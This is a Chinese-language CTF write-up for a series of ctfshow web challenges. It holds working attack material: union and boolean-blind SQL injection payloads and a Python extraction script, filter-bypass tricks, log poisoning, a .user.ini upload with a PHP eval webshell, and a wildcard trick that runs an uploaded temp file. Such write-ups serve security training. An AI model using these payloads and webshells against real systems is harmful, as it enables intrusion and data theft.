## 【ctfshow】web

### web签到题            

右键源代码，base64解密



### web2            

![image-20230410232657026](https://raw.githubusercontent.com/leekosss/photoBed/master/202304102326124.png)

直接使用联合查询union进行注入，查到表flag中存在flag字段



### web3

直接使用php伪协议

![image-20230411112357995](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111123109.png)



### web4

由于服务器是nginx，所以我们直接包含nginx日志文件

```
/var/log/nginx/access.log
```

![image-20230411113022497](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111130533.png)

然后在浏览器UA中加上一句话木马，然后使用蚁剑连接

![image-20230411113333159](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111133195.png)





### web5

```php
<?php
        $flag="";
        $v1=$_GET['v1'];
        $v2=$_GET['v2'];
        if(isset($v1) && isset($v2)){
            if(!ctype_alpha($v1)){
                die("v1 error");
            }
            if(!is_numeric($v2)){
                die("v2 error");
            }
            if(md5($v1)==md5($v2)){
                echo $flag;
            }
        }else{
        
            echo "where is flag?";
        }
    ?>
```

`ctype_alpha()`函数，判断是否只包含字母，它返回true -如果字符串只包含字母，否则返回FALSE。 

`is_numeric()`用于检测变量是否为数字或数字字符串。

显然，我们需要使用一个纯数字和一个纯字母来绕过md5

> QNKCDZO
>
> 240610708

![image-20230411113931789](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111139822.png)





### web6

sql注入，过滤了空格，我们使用 `/**/`代替

![image-20230411114245737](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111142775.png)





### web7

![image-20230411114516347](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111145380.png)



### web8

sql注入，这里使用布尔盲注

过滤了空格，union，逗号，单引号等等

```python
import requests

url = 'http://1ea7f8c2-f8ff-4e25-bf02-132c3d47e2a5.challenge.ctf.show/index.php?id=0/**/or/**/'
flag = ''
s = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
for i in range(1,80):
    for j in s:
        # payload = "ascii(substr((select/**/database())/**/from/**/{}/**/for/**/1))={}#".format(i,ord(j))  web8
        # payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/{}/**/for/**/1))={}#".format(i,ord(j))
        # payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/{}/**/for/**/1))={}#".format(i,ord(j))
        payload = "ascii(substr((select/**/group_concat(flag)/**/from/**/flag)/**/from/**/{}/**/for/**/1))={}#".format(i,ord(j))
        text =requests.get(url=url+payload).text
        if "If" in text:
            print(j,end="")
```

我们使用`/**/`代替空格，使用16进制绕过单引号，使用`substr()`函数的 `from for`语法去避免使用逗号



### web9

使用`dirmap`扫描出 `robots.txt`，访问：

```
User-agent: *
Disallow: /index.phps
```

我们下载 `index.phps`

```php
<?php
        $flag="";
		$password=$_POST['password'];
		if(strlen($password)>10){
			die("password error");
		}
		$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						 echo "登陆成功<br>";
						 echo $flag;
					 }
			}
    ?>
```

这里使用了 `md5()`，并且设置了true参数：

<img src="https://s2.loli.net/2023/04/11/hgm2uAFRWZJqfKN.png" alt="image-20230411132305698" style="zoom: 67%;" />

设置了true参数后，会将md5后的值转化为原始字符二进制形式，

所以如果`md5(,true)`后出现了 `'or'xxx`的形式就可以绕过了

php中存在这样的字符串：`ffifdyop` md5后可以转化为这种形式

![image-20230411132722359](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111327029.png)



我们将密码传过去得flag



### web10

点击取消，得到源码：

```php
<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>

```

这一题学到一个新的姿势，

`group by` 后可以使用 `with rollup`，先进行分组，然后在分组结果上进行统计

例如，我们先查询出表的数据：

![image-20230411134338648](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111343707.png)

然后我们分组看看：

![image-20230411134605729](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111347191.png)

接着使用 `with rollup`



![image-20230411134806492](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111348580.png)

我们发现它的作用是将分组结果进行统计，多了一条数据，但分组的那一列是 `NULL`

因此我们可以使用它来绕过，然后我们密码为空，这样弱比较后就相等了

![image-20230411135040934](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111350968.png)





### web11

```php
<?php
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if(strlen($password)!=strlen(replaceSpecialChar($password))){
            die("sql inject error");
        }
        if($password==$_SESSION['password']){
            echo $flag;
        }else{
            echo "error";
        }
    ?>
```

我们把cookie给删除，然后密码为空就可绕过

![image-20230411135359434](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111353472.png)





### web12

查看源码，发现 `?cmd=`

![image-20230411135840705](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111358734.png)

推测是代码执行，

```php
print_r(scandir('.'));
或
print_r(glob('*'));
```

获得当前目录下的所有文件

![image-20230411140019904](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111400950.png)

然后查看源码即可：

```
highlight_file('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');

show_source();
```





### 红包题第二弹            

和上题一样，传参cmd得源码：

```php
<?php
        if(isset($_GET['cmd'])){
            $cmd=$_GET['cmd'];
            highlight_file(__FILE__);
            if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
            
                die("cerror");
            }
            if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
                die("serror");
            }
            eval($cmd);
        
        }
    
     ?>
```

本来是无字母数字webshell，但这里过滤了这么多，唯独没有过滤字母 `p`，我们可以使用另一种方法

> 在linux中，`source`命令（`.`命令），可以用来执行shell脚本

![image-20230411140844529](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111408579.png)

我们又需要知道，

在php中临时文件目录一般在 `/tmp/`，并且php文件上传后命名格式为：`phpXXXXXX`

因此，我们可以利用这些特点，上传shell脚本，然后使用`点命令`执行脚本，其他字母使用`通配符?`代替



但是我们又知道，在php中 `eval()`函数是没有回显的，怎么才能回显呢？

我们需要使用php短标签 `<?=`

![image-20230411141425072](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111414117.png)

`<?=`相当于echo函数进行输出

例如 `<?=1;?>`将会输出1



综上，我们可以先使用 `?>`闭合前面的 `<?` 然后再使用`<?=`构造回显输出



编写上传html：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="http://838ca3e8-ca28-409d-a101-712f9d3435b3.challenge.ctf.show/" enctype="multipart/form-data" method="post">
        <input type="file" name="1.txt" >
        <input type="submit" name="smt">
    </form>
</body>
</html>
```



```
?cmd=?><?=`.+/??p/p?p??????`;
```

![image-20230411142039248](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111420301.png)





### web13

文件上传漏洞，我们观察一下，是`nginx`服务器

我们可以上传一个 `.user.ini`文件，

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111427205.png" alt="image-20230411142753157" style="zoom: 67%;" />



```
auto_prepend_file=1.txt
```

文件内容的意思是让 `.user.ini` 目录下的php文件的文件头中都包含`1.txt`文件

然后我们在 1.txt中传入一个一句话木马

![image-20230411143034545](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111430592.png)

提示文件大小错误，可能是文件太长，

然后我们使用 `dirmap`扫到了 `upload.php.bak`文件

![image-20230411143339163](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111433246.png)

```php
<?php 
	header("content-type:text/html;charset=utf-8");
	$filename = $_FILES['file']['name'];
	$temp_name = $_FILES['file']['tmp_name'];
	$size = $_FILES['file']['size'];
	$error = $_FILES['file']['error'];
	$arr = pathinfo($filename);
	$ext_suffix = $arr['extension'];
	if ($size > 24){
		die("error file zise");
	}
	if (strlen($filename)>9){
		die("error file name");
	}
	if(strlen($ext_suffix)>3){
		die("error suffix");
	}
	if(preg_match("/php/i",$ext_suffix)){
		die("error suffix");
    }
    if(preg_match("/php/i"),$filename)){
        die("error file name");
    }
	if (move_uploaded_file($temp_name, './'.$filename)){
		echo "文件上传成功！";
	}else{
		echo "文件上传失败！";
	}

 ?>

```

发现长度不能超过24，我们改成这样：

```
<?php @eval($_POST[1]);
```

然后蚁剑连接







### web14

```php
 <?php
include("secret.php");

if(isset($_GET['c'])){
    $c = intval($_GET['c']);
    sleep($c);
    switch ($c) {
        case 1:
            echo '$url';
            break;
        case 2:
            echo '@A@';
            break;
        case 555555:
            echo $url;
        case 44444:
            echo "@A@";
            break;
        case 3333:
            echo $url;
            break;
        case 222:
            echo '@A@';
            break;
        case 222:
            echo '@A@';
            break;
        case 3333:
            echo $url;
            break;
        case 44444:
            echo '@A@';
        case 555555:
            echo $url;
            break;
        case 3:
            echo '@A@';
        case 6000000:
            echo "$url";
        case 1:
            echo '@A@';
            break;
    }
}

highlight_file(__FILE__); 
```

case穿透，当我们传参`c=3`时，由于`case 3`没有加上break，会一直往下case，

这样就会执行：`echo "$url";`

![image-20230411144644805](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111446842.png)



访问该文件，在源码中发现：

```php
	if(preg_match('/information_schema\.tables|information_schema\.columns|linestring| |polygon/is', $_GET['query'])){
		die('@A@');
	}
```

看起来是sql注入，但是过滤了这些。

我们可以使用反引号 ` 绕过，MySQL中反引号一般用于保留字



查数据库：

```sql
?query=-1/**/union/**/select/**/database()
```

查表：

```sql
?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema='web'#
```

查字段：

```sql
?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'#
```

查数据：

```sql
?query=-1/**/union/**/select/**/group_concat(password)/**/from/**/content#
```

![image-20230411145822586](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111458646.png)



提示secret有密码，由于前面有一个 `secret.php` ，所以我们使用 `load_file()`读取文件内容：

![image-20230411150013705](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111500760.png)

读取：`/real_flag_is_here`

![image-20230411150036333](https://raw.githubusercontent.com/leekosss/photoBed/master/202304111500392.png)









### 萌新专属红包题            

也是一个登录页面，盲猜账号：admin，密码我们使用bp爆破

最终爆破得到，密码：admin888

![image-20230410232501070](https://raw.githubusercontent.com/leekosss/photoBed/master/202304102325173.png)

登录时抓包，base64解密得到flag

